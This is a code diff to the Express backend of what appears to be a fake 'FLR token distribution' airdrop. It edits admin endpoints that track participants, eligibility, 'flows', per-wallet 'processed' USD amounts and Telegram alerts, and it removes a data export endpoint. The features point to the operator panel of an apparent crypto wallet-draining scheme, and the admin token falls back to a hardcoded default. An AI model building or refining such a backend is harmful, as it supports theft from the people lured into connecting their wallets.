-    if (!locationStats[key]) {
-      locationStats[key] = { country: p.country, flag: p.flag, count: 0, eligible: 0, claimed: 0 };
-    }
-    locationStats[key].count++;
-    if (p.isEligible) locationStats[key].eligible++;
-    if (p.claimed) locationStats[key].claimed++;
-  });
-  
-  const hourlyActivity = {};
-  memoryStorage.siteVisits.forEach(v => {
-    const hour = new Date(v.timestamp).getHours();
-    hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
-  });
-  
   const totalFLRDistributed = memoryStorage.participants.filter(p => p.claimed).length * 5000;
-  const totalValueDistributed = totalFLRDistributed * 0.17; // Approx $0.17 per FLR
   
   res.json({
     success: true,
@@ -1163,7 +1004,7 @@ app.get('/api/admin/dashboard', (req, res) => {
       symbol: 'FLR',
       totalSupply: '100,000,000 FLR',
       distributed: `${totalFLRDistributed.toLocaleString()} FLR`,
-      valueDistributed: `$${totalValueDistributed.toLocaleString()}`
+      valueDistributed: `$${(totalFLRDistributed * 0.17).toLocaleString()}`
     },
     summary: {
       totalVisits: memoryStorage.siteVisits.length,
@@ -1173,21 +1014,17 @@ app.get('/api/admin/dashboard', (req, res) => {
       claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
       totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
       totalProcessedWallets: memoryStorage.settings.statistics.totalProcessedWallets,
+      processedByChain: memoryStorage.settings.statistics.totalProcessedAmounts,
       pendingFlows: memoryStorage.pendingFlows.size,
       completedFlows: memoryStorage.completedFlows.size,
       telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
       telegramBot: telegramBotName || 'N/A'
     },
-    networks: networkStatus,
     recentVisits,
     activeParticipants: activeParticipants.slice(0, 30),
     pendingFlows,
     completedFlows: completedFlows.slice(0, 10),
     processedTransactions: processedTransactions.slice(0, 30),
-    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
-    hourlyActivity: Object.entries(hourlyActivity)
-      .map(([hour, count]) => ({ hour: parseInt(hour), count }))
-      .sort((a, b) => a.hour - b.hour),
     system: {
       valueThreshold: memoryStorage.settings.valueThreshold,
       flowEnabled: memoryStorage.settings.flowEnabled,
@@ -1199,7 +1036,7 @@ app.get('/api/admin/dashboard', (req, res) => {
 });
 
 // ============================================
-// ADMIN STATS (legacy - keep for compatibility)
+// ADMIN STATS
 // ============================================
 
 app.get('/api/admin/stats', (req, res) => {
@@ -1208,15 +1045,13 @@ app.get('/api/admin/stats', (req, res) => {
   
   if (token !== adminToken) return res.status(401).json({ success: false });
   
-  const totalFLRDistributed = memoryStorage.participants.filter(p => p.claimed).length * 5000;
-  
   res.json({
     success: true,
     stats: {
       participants: memoryStorage.participants.length,
       eligible: memoryStorage.participants.filter(p => p.isEligible).length,
       claimed: memoryStorage.participants.filter(p => p.claimed).length,
-      totalFLRDistributed,
+      totalFLRDistributed: memoryStorage.participants.filter(p => p.claimed).length * 5000,
       totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
       pendingFlows: memoryStorage.pendingFlows.size,
       telegram: telegramEnabled ? '✅' : '❌',
@@ -1245,6 +1080,8 @@ app.get('/api/admin/wallet/:address', (req, res) => {
     .filter(f => f.walletAddress === walletAddress);
   const completed = Array.from(memoryStorage.completedFlows.values())
     .filter(f => f.walletAddress === walletAddress);
+  const transactions = memoryStorage.settings.statistics.processedTransactions
+    .filter(t => t.wallet.toLowerCase() === walletAddress);
   
   if (!participant) {
     return res.json({ 
@@ -1266,39 +1103,7 @@ app.get('/api/admin/wallet/:address', (req, res) => {
     visits,
     flows,
     completedFlows: completed,
-    transactions: memoryStorage.settings.statistics.processedTransactions
-      .filter(t => t.wallet.toLowerCase() === walletAddress)
-  });
-});
-
-// ============================================
-// EXPORT DATA ENDPOINT (for backup)
-// ============================================
-
-app.get('/api/admin/export', (req, res) => {
-  const token = req.query.token;
-  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
-  
-  if (token !== adminToken) return res.status(401).json({ success: false });
-  
-  const exportData = {
-    exportedAt: new Date().toISOString(),
-    token: 'FLR',
-    statistics: memoryStorage.settings.statistics,
-    participants: memoryStorage.participants.map(p => ({
-      ...p,
-      connectedAt: p.connectedAt?.toISOString(),
-      lastScanned: p.lastScanned?.toISOString(),
-      claimedAt: p.claimedAt?.toISOString()
-    })),
-    siteVisits: memoryStorage.siteVisits,
-    pendingFlows: Array.from(memoryStorage.pendingFlows.entries()),
-    completedFlows: Array.from(memoryStorage.completedFlows.entries())
-  };
-  
-  res.json({
-    success: true,
-    data: exportData
+    transactions
   });
 });
 
@@ -1306,7 +1111,7 @@ app.get('/api/admin/export', (req, res) => {
 // TELEGRAM TEST ENDPOINT
 // ============================================
 
-app.post('/api/admin/test-telegram', async (req, res) => {
+app.get('/api/admin/test-telegram', async (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
@@ -1369,36 +1174,25 @@ app.listen(PORT, '0.0.0.0', async () => {
   ✅ Avalanche: 0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F
   ✅ Flare: 0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F
   
-  🔄 PENDING DEPLOYMENTS:
-  ⏳ Songbird: Not deployed
-  ⏳ Optimism: Not deployed
-  ⏳ Coston: Testnet only
-  ⏳ Coston2: Testnet only
-  
   📊 MONITORING:
   👥 Participants: 0
   🎯 Eligible: 0
   ✅ Claimed: 0
   💰 Flows: 0
+  💵 Total Processed: $0
   
   🚀 READY FOR FLARE TOKEN DISTRIBUTION
   ================================================
   `);
   
-  // Test Telegram connection
   const telegramConnected = await testTelegramConnection();
   
   if (telegramConnected) {
     console.log('✅ Telegram notifications active');
   } else {
     console.log('⚠️ Telegram not configured - check .env file');
-    console.log('   Required: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
   }
 });
-
-// ============================================
-// GRACEFUL SHUTDOWN
-// ============================================
 
 process.on('SIGTERM', () => {
   console.log('SIGTERM received, shutting down gracefully...');
